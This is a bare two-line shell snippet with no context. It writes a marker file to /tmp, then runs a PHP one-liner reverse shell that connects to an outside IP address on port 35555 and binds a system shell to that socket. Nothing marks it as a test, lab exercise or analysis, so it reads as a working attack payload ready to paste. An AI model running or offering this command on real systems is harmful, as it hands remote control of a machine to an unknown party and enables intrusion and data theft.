echo "check" > /tmp/z22
php -r '$sock=fsockopen("45.8.159.51",35555);exec("sh <&3 >&3 2>&3");'
